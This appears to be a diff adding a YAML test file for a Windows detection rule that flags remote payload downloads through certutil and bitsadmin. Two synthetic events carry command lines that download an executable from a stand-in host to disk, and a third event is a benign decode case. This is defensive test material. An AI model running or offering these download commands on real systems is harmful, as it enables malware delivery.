@@ -1,0 +1,15 @@
+# Tests for E-015 — Remote Payload Download via a LOLBin. Synthetic data only.
+rule: E-015_lolbin_remote_download
+cases:
+  - name: certutil urlcache download fires
+    should_fire: true
+    events:
+      - { Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -urlcache -f http://x/y.exe C:\Users\Public\y.exe', ParentImage: 'C:\Windows\System32\cmd.exe', SubjectUserName: attacker }
+  - name: bitsadmin transfer fires
+    should_fire: true
+    events:
+      - { Image: 'C:\Windows\System32\bitsadmin.exe', CommandLine: 'bitsadmin /transfer j http://x/y.exe C:\Temp\y.exe', ParentImage: 'C:\Windows\System32\cmd.exe', SubjectUserName: attacker }
+  - name: certutil decoding a local file (no download) does not fire
+    should_fire: false
+    events:
+      - { Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -decode in.b64 out.bin', ParentImage: 'C:\Windows\System32\cmd.exe', SubjectUserName: jsmith }
